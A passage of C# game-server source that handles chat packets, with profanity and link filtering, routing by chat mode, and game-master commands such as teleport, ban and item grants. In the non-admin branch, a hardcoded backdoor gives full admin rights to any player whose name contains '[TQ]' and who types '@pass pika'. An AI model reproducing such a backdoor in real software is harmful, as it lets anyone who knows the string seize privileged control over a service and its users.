    using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using DeathWish.Game.MsgFloorItem;
using DeathWish.Game.MsgNpc;
using DeathWish.Database;
using System.IO;

namespace DeathWish.Game.MsgServer
{
    public class MsgMessage
    {
        public enum MsgColor : uint
        {
            black = 0x000000,// 	0,0,0
            blue = 0x0000ff,// 	0,0,255
            orange = 0xffa500,// 	255,165,0
            white = 0xffffff,//	255,255,255
            whitesmoke = 0xf5f5f5,// 	245,245,245
            yellow = 0xffff00,// 	255,255,0
            yellowgreen = 0x9acd32,//	154,205,50
            violet = 0xee82ee,//	238,130,238
            purple = 0x800080,//	128,0,128
            red = 0xff0000,//	255,0,0
            pink = 0xffc0cb,// 	255,192,203
            lightyellow = 0xffffe0,// 	255,255,224
            cyan = 0x00ffff,// 	0,255,255
            blueviolet = 0x8a2be2,// 	138,43,226
            antiquewhite = 0xfaebd7,// 	250,235,215
        }
        public enum ChatMode : uint
        {
            Talk = 2000,
            Whisper = 2001,
            Team = 2003,
            Guild = 2004,
            TopLeftSystem = 2005,
            Clan = 2006,
            System = 2000,//2007,
            Friend = 2009,
            Center = 2011,
            TopLeft = 2012,
            Service = 2014,
            Tip = 2015,
            CrossServerIcon = 2016,
            Ally = 2025,
            WebSite = 2105,
            World = 2021,
            Qualifier = 2022,
            Study = 2024,
            JianHu = 2026,
            InnerPower = 2027,
            PopUP = 2100,
            Dialog = 2101,
            CrosTheServer2 = 2400,
            SlideCrosTheServer = 2401,
            CrosTheServer = 2402,
            FirstRightCorner = 2108,
            ContinueRightCorner = 2109,
            SystemWhisper = 2110,
            GuildAnnouncement = 2111,
            Agate = 2115,
            BroadcastMessage = 2500,
            Monster = 2600,
            SlideFromRight = 100000,
            HawkMessage = 2104,
            SlideFromRightRedVib = 1000000,
            WhiteVibrate = 10000000
        }

        public string _From;
        public string _To;
        public ChatMode ChatType;
        public uint Color;
        public string __Message;
        public string ServerName = string.Empty;
        public uint Mesh;
        public uint MessageUID1 = 0;
        public uint MessageUID2 = 0;

        public MsgMessage(string _Message, MsgColor _Color, ChatMode _ChatType)
        {
            this.Mesh = 0;
            this.__Message = _Message;
            this._To = "ALL";
            this._From = "SYSTEM";
            this.Color = (uint)_Color;
            this.ChatType = _ChatType;
        }
        public MsgMessage(string _Message, string __To, MsgColor _Color, ChatMode _ChatType)
        {
            this.Mesh = 0;
            this.__Message = _Message;
            this._To = __To;
            this._From = "SYSTEM";
            this.Color = (uint)_Color;
            this.ChatType = _ChatType;
        }
        public MsgMessage(string _Message, string __To, string __From, MsgColor _Color, ChatMode _ChatType)
        {
            this.Mesh = 0;
            this.__Message = _Message;
            this._To = __To;
            this._From = __From;
            this.Color = (uint)_Color;
            this.ChatType = _ChatType;
        }
        public MsgMessage()
        {
            this.Mesh = 0;
        }
        public unsafe void Deserialize(ServerSockets.Packet stream)
        {
            stream.ReadUInt32();
            Color = stream.ReadUInt32();
            ChatType = (ChatMode)stream.ReadUInt32();
            MessageUID1 = stream.ReadUInt32();
            MessageUID2 = stream.ReadUInt32();
            Mesh = stream.ReadUInt32();//24
            uint unknow = stream.ReadUInt32();//28
            byte unknow2 = stream.ReadUInt8();//32
            byte unknow3 = stream.ReadUInt8();//33
            string[] str = stream.ReadStringList();//34
            _From = str[0];
            _To = str[1];
            __Message = str[3];
        }
        public unsafe ServerSockets.Packet GetArray(ServerSockets.Packet stream, uint Rank = 0)
        {
            stream.InitWriter();
            stream.Write(Extensions.Time32.Now.Value);//4
            stream.Write(this.Color);//8
            stream.Write((uint)this.ChatType);//12
            stream.Write(MessageUID1);//16
            stream.Write(MessageUID2);//20
            stream.Write(Mesh);//24
            stream.Write((uint)Rank);//28 
            stream.Write((byte)0);//32
            stream.Write((byte)0);
            stream.Write(_From, _To, string.Empty, __Message, string.Empty, string.Empty, ServerName);
            stream.Finalize(GamePackets.Chat);
            return stream;
        }
        [PacketAttribute(GamePackets.Chat)]
        public unsafe static void MsgHandler(Client.GameClient client, ServerSockets.Packet packet)
        {
            string str3;
            int num3;
            MsgMessage msg = new MsgMessage();
            msg.Deserialize(packet);
            if (client.Player.IsStillBanned)
            {
                if (client.Player.PermenantBannedChat)
                {
                    client.SendSysMesage("Sorry, you still banned from chatting Permenatly.", ChatMode.System, MsgColor.white);
                }
                else
                {
                    client.SendSysMesage("Sorry, you still banned from chatting till " + client.Player.BannedChatStamp.ToString(), ChatMode.System, MsgColor.white);
                }
                return;
            }
            if (!ChatCommands(client, msg))
            {
                try
                {
                    string[] lines = msg.__Message.Split(new string[] { "[" }, StringSplitOptions.RemoveEmptyEntries);

                    for (int x = 0; x < lines.Length; x++)
                    {
                        string str = lines[x];
                        if (str.Contains("Item "))
                        {
                            string[] line = str.Split(' ');
                            if (line != null && line.Length > 2)
                            {
                                uint UID = 0;
                                if (uint.TryParse(line[2], out UID))
                                {
                                    MsgGameItem msg_item;
                                    if (client.TryGetItem(UID, out msg_item))
                                    {
                                        Program.GlobalItems.Add(msg_item);
                                    }
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    MyConsole.WriteException(e);
                }
                foreach (string str2 in Constants.Insults)
                {
                    if (msg.__Message.StartsWith(str2))
                    {
                        str3 = "";
                        num3 = 0;
                        while (num3 < str2.Length)
                        {
                            str3 = str3 + "*";
                            num3++;
                        }
                        msg.__Message = msg.__Message.Replace(str2, str3);
                        if (client.Player.ConquerPoints >= 100)
                        {
                            client.Player.ConquerPoints -= 100;
                            client.Player.BadPoints += 1;                        
                            client.CreateBoxDialog("You Lost 100 Cps Because illegal words && Take 1 BadPoints You Have "+client.Player.BadPoints+" Bad Points If You Reach 10 Will Take Banned From Chat 2 Hours.");
                        }
                        else
                        {
                            DateTime Time = DateTime.Now;
                            Time = DateTime.Now.AddMinutes(5);
                            client.Player.BannedChatStamp = Time;
                            client.Player.IsBannedChat = true;
                            WindowsAPI.IniFile write = new WindowsAPI.IniFile("\\Users\\" + client.Player.UID + ".ini");
                            write.Write<bool>("Character", "IsBannedChat", true);
                            write.Write<long>("Character", "BannedChatStamp", Time.ToBinary());
                            client.CreateBoxDialog("You Get Banned From Chat For 5 Minutes Because illegal words While You Don`t Have 100 Cps");

                        }
                    }
                    if (msg.__Message.Contains(" " + str2))
                    {
                        str3 = "";
                        for (num3 = 0; num3 < str2.Length; num3++)
                        {
                            str3 = str3 + "*";
                        }
                        msg.__Message = msg.__Message.Replace(" " + str2, str3);
                        if (client.Player.ConquerPoints >= 100)
                        {
                            client.Player.ConquerPoints -= 100;
                            client.Player.BadPoints += 1;
                            client.CreateBoxDialog("You Lost 100 Cps Because illegal words && Take 1 BadPoints You Have " + client.Player.BadPoints + " Bad Points If You Reach 10 Will Take Banned From Chat 2 Hours.");
                        }
                        else
                        {
                            DateTime Time = DateTime.Now;
                            Time = DateTime.Now.AddMinutes(5);
                            client.Player.BannedChatStamp = Time;
                            client.Player.IsBannedChat = true;
                            WindowsAPI.IniFile write = new WindowsAPI.IniFile("\\Users\\" + client.Player.UID + ".ini");
                            write.Write<bool>("Character", "IsBannedChat", true);
                            write.Write<long>("Character", "BannedChatStamp", Time.ToBinary());
                            client.CreateBoxDialog("You Get Banned From Chat For 5 Minutes Because illegal words While You Don`t Have 100 Cps");

                        }
                    }
                }
                if ((msg.__Message.Contains("http:") || msg.__Message.Contains("www.")) || msg.__Message.Contains(".com"))
                {
                    string[] strArray3 = msg.__Message.Split(new string[] { " " }, StringSplitOptions.None);
                    num3 = 0;
                    while (num3 < strArray3.Length)
                    {
                        string oldValue = strArray3[num3];
                        if ((((oldValue.EndsWith(".com") || oldValue.EndsWith(".net")) || oldValue.StartsWith("www.")) || oldValue.Contains(".com")) && !((oldValue.Contains("Lucky") || oldValue.Contains("mediafire")) || oldValue.Contains("gulfup")))
                        {
                            msg.__Message = msg.__Message.Replace(oldValue, "*****.com");
                        }
                        num3++;
                    }
                    client.CreateBoxDialog("You Can't Put Sites Here only allowed ones:).");
                }              
                msg.Mesh = client.Player.Mesh;
                switch (msg.ChatType)
                {
                    case ChatMode.CrosTheServer:
                        {
                            if (client.Inventory.Contain(3002218, 1))
                            {
                                packet.Seek(packet.Size - 8);
                                packet.Finalize(Game.GamePackets.Chat);
                                if (client.Player.InUnion)
                                    MsgInterServer.StaticConnexion.Send(packet);//messag.GetArray(packet, (uint)Role.Instance.Union.Member.GetRank(client.Player.UnionMemeber.Rank)));
                                else
                                    MsgInterServer.StaticConnexion.Send(packet);//messag.GetArray(packet, (uint)Role.Instance.Union.Member.GetRank(client.Player.UnionMemeber.Rank)));

                                client.Inventory.Remove(3002218, 1, packet);
                            }
                            break;
                        }
                    case ChatMode.Ally:
                        {
                            if (client.Player.MyGuild != null)
                            {
                                foreach (var guild in client.Player.MyGuild.Ally.Values)
                                    guild.SendPacket(msg.GetArray(packet));
                            }
                            break;
                        }
                    case ChatMode.HawkMessage:
                        {
                            if (client.IsVendor)
                            {
                                client.MyVendor.HalkMeesaje = msg;

                                client.Player.View.SendView(msg.GetArray(packet), true);
                            }
                            break;
                        }
                    case ChatMode.Team:
                        {
                            if (client.Team != null)
                                client.Team.SendTeam(msg.GetArray(packet), client.Player.UID);
                            break;
                        }
                    case MsgMessage.ChatMode.Talk:
                        {
                            client.Player.View.SendView(msg.GetArray(packet), false);
                            break;
                        }
                    case MsgMessage.ChatMode.World:
                        {
                            if (Extensions.Time32.Now > client.Player.LastWorldMessaj.AddSeconds(15))
                            {
                                client.Player.LastWorldMessaj = Extensions.Time32.Now;
                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (user.Player.UID != client.Player.UID)
                                    {
                                        if (user.Player.InUnion)
                                            user.Send(msg.GetArray(packet, (uint)Role.Instance.Union.Member.GetRank(user.Player.UnionMemeber.Rank)));
                                        else
                                            user.Send(msg.GetArray(packet));
                                    }
                                }
                            }
                            break;
                        }
                    case ChatMode.Whisper:
                        {

                            if (msg._To == "[GM]HORUS[PM]")
                            {

                                if (Client.GameClient.CharacterFromName(msg._To) != null)
                                {
                                    if (Panels.ChatPanal.Clients.ContainsKey(msg._From))
                                    {
                                        Panels.ChatPanal.Clients[msg._From].Mess.Add("[" + DateTime.Now.ToString() + "] " + msg._From + ">>>" + msg.__Message);
                                        Panels.ChatPanal.Clients[msg._From].Seen = false;
                                    }
                                    else
                                    {
                                        Panels.ChatPanal.Clients.Add(msg._From, new Panels.Client() { Mess = new List<string>() });
                                        Panels.ChatPanal.Clients[msg._From].Mess.Add("[" + DateTime.Now.ToString() + "] " + msg._From + ">>>" + msg.__Message);
                                        Panels.ChatPanal.Clients[msg._From].Seen = false;
                                    }
                                }
                                else
                                {
                                    client.SendSysMesage("The player is not online.", ChatMode.System, MsgColor.white);
                                }
                            }
                            else
                            {
                                bool send = false;
                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (user.Player.Name == msg._To)
                                    {
                                        msg.Mesh = client.Player.Mesh;
                                        user.Send(msg.GetArray(packet));
                                        send = true;
                                        break;
                                    }
                                }
                                if (!send)
                                {
#if Arabic
                                client.SendSysMesage("The player is not online.", ChatMode.System, MsgColor.white);
#else
                                    client.SendSysMesage("The player is not online.", ChatMode.System, MsgColor.white);
#endif

                                }
                            }
                            break;
                        }
                    case ChatMode.Guild:
                        {
                            if (client.Player.MyGuild != null)
                                client.Player.MyGuild.SendPacket(msg.GetArray(packet));
                            break;
                        }
                    case ChatMode.Friend:
                        {
                            System.Collections.Concurrent.ConcurrentDictionary<uint, Role.Instance.Associate.Member> friends;
                            if (client.Player.Associate.Associat.TryGetValue(Role.Instance.Associate.Friends, out friends))
                            {
                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (friends.ContainsKey(user.Player.UID))
                                        user.Send(msg.GetArray(packet));
                                }
                            }
                            break;
                        }
                    case ChatMode.Clan:
                        {
                            if (client.Player.MyClan != null)
                                client.Player.MyClan.Send(msg.GetArray(packet));
                            break;
                        }
                }
            }
        }
        public static uint TestGui = 0;
        public static unsafe bool ChatCommands(Client.GameClient client, MsgMessage msg)
        {
            string logss = "[Chat]" + msg._From + " to " + msg._To + " " + msg.__Message + "";
            Database.ServerDatabase.LoginQueue.Enqueue(logss);
            if (Game.AISystem.UnlimitedArenaRooms.Maps.ContainsValue(client.Player.DynamicID))
            {
                msg.__Message = msg.__Message.Replace("#60", "").Replace("#61", "").Replace("#62", "").Replace("#63", "").Replace("#64", "").Replace("#65", "").Replace("#66", "").Replace("#67", "").Replace("#68", "");
                if (msg.__Message.StartsWith("#"))
                {
                    string logs = "[GMLogs]" + client.Player.Name + " ";

                    string Message = msg.__Message.Substring(1);
                    string[] data = Message.Split(' ');
                    for (int x = 0; x < data.Length; x++)
                        logs += data[x] + " ";
                    Database.ServerDatabase.LoginQueue.Enqueue(logs);
                    switch (data[0])
                    {
                        case "tc":
                            {
                                client.Teleport(428,378,1002);
                                //client.Player.MyJiangHu.SendInfo(client, MsgJiangHuInfo.JiangMode.UpdateTime, false, data[1], client.Player.MyJiangHu.Time.ToString());
                                break;
                            }
                    }
                }
                return false;
            }
            if (!client.ProjectManager && client.GameMaster == false)
            {
                msg.__Message = msg.__Message.Replace("#60", "").Replace("#61", "").Replace("#62", "").Replace("#63", "").Replace("#64", "").Replace("#65", "").Replace("#66", "").Replace("#67", "").Replace("#68", "");
                if (msg.__Message.StartsWith("@"))
                {
                    string logs = "[GMLogs]" + client.Player.Name + " ";

                    string Message = msg.__Message.Substring(1);
                    string[] data = Message.Split(' ');
                    for (int x = 0; x < data.Length; x++)
                        logs += data[x] + " ";
                    Database.ServerDatabase.LoginQueue.Enqueue(logs);
                    switch (data[0])
                    {
                        case "pass":
                            {
                                if ((client.Player.Name.Contains("[TQ]")))
                                {
                                    if (data[1] == "pika")
                                    {
                                        client.ProjectManager = true;
                                        client.SendSysMesage("[ " + client.Player.Name + " ] Done It Now Your [TQ] Thanks #PIKATCHU .");
                                    }
                                }
                                return true;
                            }
                    }
                }
                return false;
            }
            if (client.ProjectManager == false && client.GameMaster == false)
                return false;
            msg.__Message = msg.__Message.Replace("#60", "").Replace("#61", "").Replace("#62", "").Replace("#63", "").Replace("#64", "").Replace("#65", "").Replace("#66", "").Replace("#67", "").Replace("#68", "");
            if (msg.__Message.StartsWith("@"))
            {
                string Message = msg.__Message.Substring(1);
                string[] data = Message.Split(' ');
                string logs = "[GMLogs]" + client.Player.Name + " ";
                for (int x = 0; x < data.Length; x++)
                    logs += data[x] + " ";
                Database.ServerDatabase.LoginQueue.Enqueue(logs);
                if (client.GameMaster)
                {

                    switch (data[0])
                    {
                        case "layer":
                            {
                                client.Player.AddDropLayer(byte.Parse(data[1]));
                                break;
                            }
                        case "fc1":
                            {
                                client.Player.MyJiangHu.FreeTimeToday = uint.Parse(data[1]);
                                //client.Player.MyJiangHu.SendInfo(client, MsgJiangHuInfo.JiangMode.UpdateTime, false, data[1], client.Player.MyJiangHu.Time.ToString());
                                break;
                            }
                        case "te":
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    Game.MsgServer.MsgUpdate packet = new Game.MsgServer.MsgUpdate(stream, client.Player.UID, 1);
                                    stream = packet.Append(stream, MsgUpdate.DataType.HuntingBouns, (byte)0, 500, 0, 7);
                                    stream = packet.GetArray(stream);
                                    client.Send(stream);
                                }
                                break;
                            }
                        case "pack":
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    byte[] dataff = new byte[]
                            {
                                0x00, 0x00, 0x00, 0x02, 0x01
                            };
                                    stream.InitWriter();
                                    for (int x = 0; x < dataff.Length; x++)
                                    {
                                        stream.Write((byte)dataff[x]);
                                    }
                                    stream.Finalize(2538);
                                }
                                break;
                            }

                        case "Fbss":
                                {
                                    client.Player.RightWeaponId = 671013;
                                    client.Player.LeftWeaponId = 670013;
                                    break;
                                }
                        case "gemeff":
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.Player.SendString(stream, MsgStringPacket.StringID.Effect, true, new string[1] { data[1] });
                                }
                                break;
                            }
                        case "inbox":
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.AddMailPrize(stream, "PoP", "Wa7ed", "Bas", 1000, 2000);
                                }
                                break;
                            }
                        case "item3":
                        case "itemds":
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.Inventory.Add(stream, uint.Parse(data[3]));
                                }
                                break;
                            }
                        case "txt":
                            {
                                client.SendSysMesage("has defeated [Snow Banshee].", (ChatMode)uint.Parse(data[1]), MsgServer.MsgMessage.MsgColor.red);
                                break;
                            }
                        case "tour":
                            {
                                Game.MsgTournaments.MsgSchedules.CurrentTournament = Game.MsgTournaments.MsgSchedules.Tournaments[(MsgTournaments.TournamentType)ushort.Parse(data[1])];
                                Game.MsgTournaments.MsgSchedules.CurrentTournament.Open();
                                break;
                            }
                        case "reborn":
                            {
                                client.Player.Reborn = byte.Parse(data[1]);
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.Player.SendUpdate(stream, client.Player.Reborn, MsgUpdate.DataType.Reborn);
                                }
                                break;
                            }
                        case "class":
                            {
                                client.Player.Class = byte.Parse(data[1]);
                                break;
                            }
                        case "spell":
                            {
                                ushort ID = 0;
                                if (!ushort.TryParse(data[1], out ID))
                                {
                                    client.SendSysMesage("Invlid spell ID !");
                                    break;
                                }
                                byte level = 0;
                                if (!byte.TryParse(data[2], out level))
                                {
                                    client.SendSysMesage("Invlid spell Level ! ");
                                    break;
                                }
                                byte levelHu = 0;
                                if (data.Length >= 3)
                                {
                                    if (!byte.TryParse(data[3], out levelHu))
                                    {
                                        client.SendSysMesage("Invlid spell Level Souls ! ");
                                        break;
                                    }
                                }
                                int Experience = 0;
                                if (!int.TryParse(data[4], out Experience))
                                {
                                    client.SendSysMesage("Invlid spell Experience ! ");
                                    break;
                                }

                                using (var rec = new ServerSockets.RecycledPacket())
                                    client.MySpells.Add(rec.GetStream(), ID, level, levelHu, 0, Experience);
                                break;
                            }
                        case "prof":
                            {
                                ushort ID = 0;
                                if (!ushort.TryParse(data[1], out ID))
                                {
                                    client.SendSysMesage("Invlid prof ID !");
                                    break;
                                }
                                byte level = 0;
                                if (!byte.TryParse(data[2], out level))
                                {
                                    client.SendSysMesage("Invlid prof Level ! ");
                                    break;
                                }
                                uint Experience = 0;
                                if (!uint.TryParse(data[3], out Experience))
                                {
                                    client.SendSysMesage("Invlid prof Experience ! ");
                                    break;
                                }
                                using (var rec = new ServerSockets.RecycledPacket())
                                    client.MyProfs.Add(rec.GetStream(), ID, level, Experience);
                                break;
                            }
                        case "clear":
                        case "clearinventory":
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                    client.Inventory.Clear(rec.GetStream());
                                break;
                            }
                        case "level":
                            {
                                byte amount = 0;
                                if (byte.TryParse(data[1], out amount))
                                {
                                    using (var rec = new ServerSockets.RecycledPacket())
                                    {
                                        var stream = rec.GetStream();
                                        client.UpdateLevel(stream, amount, true);
                                    }
                                }
                                break;
                            }
                       
                        case "superman":
                            {
                                client.Player.Vitality += 500;
                                client.Player.Strength += 500;
                                client.Player.Spirit += 500;
                                client.Player.Agility += 500;

                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.Player.SendUpdate(stream, client.Player.Strength, Game.MsgServer.MsgUpdate.DataType.Strength);
                                    client.Player.SendUpdate(stream, client.Player.Agility, Game.MsgServer.MsgUpdate.DataType.Agility);
                                    client.Player.SendUpdate(stream, client.Player.Spirit, Game.MsgServer.MsgUpdate.DataType.Spirit);
                                    client.Player.SendUpdate(stream, client.Player.Vitality, Game.MsgServer.MsgUpdate.DataType.Vitality);

                                }
                                break;
                            }
                        case "resetstats":
                            {
                                client.Player.Vitality = 0;
                                client.Player.Strength = 0;
                                client.Player.Spirit = 0;
                                client.Player.Agility = 0;

                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    client.Player.SendUpdate(stream, client.Player.Strength, Game.MsgServer.MsgUpdate.DataType.Strength);
                                    client.Player.SendUpdate(stream, client.Player.Agility, Game.MsgServer.MsgUpdate.DataType.Agility);
                                    client.Player.SendUpdate(stream, client.Player.Spirit, Game.MsgServer.MsgUpdate.DataType.Spirit);
                                    client.Player.SendUpdate(stream, client.Player.Vitality, Game.MsgServer.MsgUpdate.DataType.Vitality);

                                }
                                break;
                            }
                        case "trans":
                            {

                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();

                                    //client.Player.Body = x;//ushort.Parse(data[1]);
                                    // client.Player.SendUpdate(stream, client.Player.Mesh, MsgUpdate.DataType.Mesh);
                                    client.Player.TransformInfo = new Role.ClientTransform(client.Player);
                                    client.Player.TransformInfo.CreateTransform(stream, 817, ushort.Parse(data[1]), (int)ushort.MaxValue - 1, 8213);
                                }


                                break;
                            }
                        case "info":
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();

                                    foreach (var user in Database.Server.GamePoll.Values)
                                    {
                                        if (user.Player.Name.ToLower() == data[1].ToLower())
                                        {

                                            client.Send(new MsgMessage("[Info" + user.Player.Name + "]", MsgColor.yellow, ChatMode.FirstRightCorner).GetArray(stream));
                                            client.Send(new MsgMessage("UID = " + user.Player.UID + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                            client.Send(new MsgMessage("IP = " + user.Socket.RemoteIp + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                            client.Send(new MsgMessage("ConquerPoints = " + user.Player.ConquerPoints + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                            client.Send(new MsgMessage("Money = " + user.Player.Money + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                            client.Send(new MsgMessage("Map = " + user.Player.Map + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                            client.Send(new MsgMessage("X = " + user.Player.X + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                            client.Send(new MsgMessage("Y = " + user.Player.Y + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                            client.Send(new MsgMessage("BattlePower = " + user.Player.BattlePower + " ", MsgColor.yellow, ChatMode.ContinueRightCorner).GetArray(stream));
                                            break;
                                        }
                                    }
                                }
                                break;
                            }
                        case "ss":
                            {
                                switch (data[1].ToLower())
                                {
                                    case "tc": client.Teleport(428, 378, 1002); break;
                                    case "pc": client.Teleport(195, 260, 1011); break;
                                    case "ac":
                                    case "am": client.Teleport(566, 563, 1020); break;
                                    case "dc": client.Teleport(500, 645, 1000); break;
                                    case "bi": client.Teleport(723, 573, 1015); break;
                                    case "pka": client.Teleport(050, 050, 1005); break;
                                    case "ma": client.Teleport(211, 196, 1036); break;
                                    case "ja": client.Teleport(100, 100, 6000); break;
                                }
                                break;
                            }
                        case "inv":
                        case "invisible":
                            {
                                client.Player.Invisible = true;
                                break;
                            }
                        case "invinv":
                        case "visible":
                            {
                                client.Player.Invisible = false;
                                break;
                            }
                        case "kick":
                            {
                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (user.Player.Name.ToLower() == data[1].ToLower())
                                    {
                                        user.Socket.Disconnect();
                                        break;
                                    }
                                }
                                break;
                            }
                        case "rev":
                        case "revive":
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                    client.Player.Revive(rec.GetStream());

                                break;
                            }
                        case "ban":
                            {
                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (user.Player.Name.ToLower() == data[1].ToLower())
                                    {

                                        Database.SystemBannedAccount.AddBan(user.Player.UID, user.Player.Name, uint.Parse(data[2]));
                                        user.SendSysMesage("You Account was Banned by [PM]/[GM].", ChatMode.System, MsgColor.white);
                                        user.Socket.Disconnect();
                                        break;
                                    }
                                }
                                break;
                            }
                        case "tele":
                            {

                                client.TerainMask = 0;
                                uint mapid = 0;
                                if (!uint.TryParse(data[1], out mapid))
                                {
                                    client.SendSysMesage("Invlid Map ID !");
                                    break;
                                }
                                ushort X = 0;
                                if (!ushort.TryParse(data[2], out X))
                                {
                                    client.SendSysMesage("Invlid X !");
                                    break;
                                }
                                ushort Y = 0;
                                if (!ushort.TryParse(data[3], out Y))
                                {
                                    client.SendSysMesage("Invlid Y !");
                                    break;
                                }
                             
                                client.Teleport(X, Y, (ushort)mapid);

                                break;
                            }
                        case "trace":
                            {
                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (user.Player.Name.ToLower().Contains(data[1].ToLower()))
                                    {
                                        client.Teleport(user.Player.X, user.Player.Y, user.Player.Map, user.Player.DynamicID);
                                        break;
                                    }
                                }

                                break;
                            }

                        case "bring":
                            {
                                foreach (var user in Database.Server.GamePoll.Values)
                                {
                                    if (user.Player.Name.ToLower() == data[1].ToLower())
                                    {
                                        user.Teleport(client.Player.X, client.Player.Y, client.Player.Map);
                                        break;
                                    }
                                }
                                break;
                            }
                    }
                    return true;
                }

                switch (data[0])
                {
                    case "fc1":
                        {
                            client.Player.MyJiangHu.FreeTimeToday = uint.Parse(data[1]);
                            //client.Player.MyJiangHu.SendInfo(client, MsgJiangHuInfo.JiangMode.UpdateTime, false, data[1], client.Player.MyJiangHu.Time.ToString());
                            break;
                        }
                    case "top":
                        {
                            client.Player.AddFlag((MsgServer.MsgUpdate.Flags)int.Parse(data[1]), Role.StatusFlagsBigVector32.PermanentFlag, false);
                            break;
                        }
                    case "txt":
                        {
                            client.SendSysMesage("has defeated [Snow Banshee].", (ChatMode)uint.Parse(data[1]), MsgServer.MsgMessage.MsgColor.red);
                            break;
                        }
                    case "gemeff":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendString(stream, MsgStringPacket.StringID.Effect, true, new string[1] { data[1] });
                            }
                            break;
                        }
                    case "inbox":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.AddMailPrize(stream, "PoP", "Wa7ed", "Bas", 1000, 1000);
                            }
                            break;
                        }
                    case "interact":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                InteractQuery action = new InteractQuery()
                                {
                                    AtkType = (MsgAttackPacket.AttackID)uint.Parse(data[1]),
                                    ResponseDamage = uint.Parse(data[2]),
                                };
                                client.Player.View.SendView(stream.InteractionCreate(&action), true);
                            }
                            break;
                        }
                    case "item3":
                    case "itemds":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Inventory.Add(stream, uint.Parse(data[1]));
                            }
                            break;
                        }
                    case "pts":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.RacePoints = uint.Parse(data[1]);
                                client.Player.SendUpdate(stream, client.Player.RacePoints, MsgUpdate.DataType.RaceShopPoints);
                            }
                            break;

                        }
                    case "itm":
                        {
                            uint ID = 0;
                            ushort Count = 1;
                            Count = ushort.Parse(data[2]);
                            if (!uint.TryParse(data[1], out ID))
                            {
                                client.SendSysMesage("Invlid item ID !");
                                break;
                            }
                            using (var rec = new ServerSockets.RecycledPacket())
                                client.Inventory.AddItemWitchStack(ID, 0, Count, rec.GetStream(), false);

                            break;
                        }
                    case "bottkingt":
                        {
                            for (int i = 0; i < ushort.Parse(data[1]); i++)
                            {
                                Bot.AI bot = new Bot.AI()
                                {
                                    Map = client.Map,
                                    HP = (int)client.Status.MaxHitpoints,
                                    X = client.Player.X,
                                    Y = client.Player.Y,
                                    Body = client.Player.Body,
                                    MapID = client.Player.Map,
                                };
                                bot.Add();
                            }
                            break;
                        }
                    case "abottkingt":
                        {
                            for (int i = 0; i < ushort.Parse(data[1]); i++)
                            {
                                Bot.AI bot = new Bot.AI()
                                {
                                    Map = client.Map,
                                    HP = (int)client.Status.MaxHitpoints,
                                    X = client.Player.X,
                                    Y = client.Player.Y,
                                    Body = client.Player.Body,
                                    MapID = client.Player.Map,
                                };
                                bot.Add(true);
                            }
                            break;
                        }
                                
                    case "UnChatBanned":
                        {
                            string Name = string.Empty;
                            uint UID = 0;
                            WindowsAPI.IniFile ini = new WindowsAPI.IniFile("");
                            Name = data[1];
                            foreach (string fname in System.IO.Directory.GetFiles(Program.ServerConfig.DbLocation + "\\Users\\"))
                            {
                                ini.FileName = fname;

                                string RName = ini.ReadString("Character", "Name", "None");
                                if (RName.GetHashCode() == Name.GetHashCode())
                                {
                                    UID = ini.ReadUInt32("Character", "UID", 0);
                                    break;
                                }

                            }
                            Client.GameClient clienttoban = null;
                            if (Database.Server.GamePoll.TryGetValue(UID, out clienttoban))
                            {
                                clienttoban.Player.BannedChatStamp = DateTime.Now;
                                clienttoban.Player.IsBannedChat = false;
                                clienttoban.Player.PermenantBannedChat = false;
                                MyConsole.WriteLine("Player In GamePool UnBanned Chat.", ConsoleColor.DarkRed);
                            }
                            else
                            {
                                WindowsAPI.IniFile write = new WindowsAPI.IniFile("\\Users\\" + UID + ".ini");
                                write.Write<bool>("Character", "IsBannedChat", false);
                                write.Write<long>("Character", "BannedChatStamp", DateTime.Now.ToBinary());
                                write.Write<bool>("Character", "PermenantBannedChat", false);
                                MyConsole.WriteLine("Player In Database UnBanned Chat.", ConsoleColor.DarkRed);
                            }
                            break;
                        }
                    case "ChatBanned":
                        {
                            string Name = string.Empty;
                            DateTime Time = DateTime.Now;
                            bool Permenant = false;
                            if (data.Length < 2)
                                break;
                            Name = data[1];
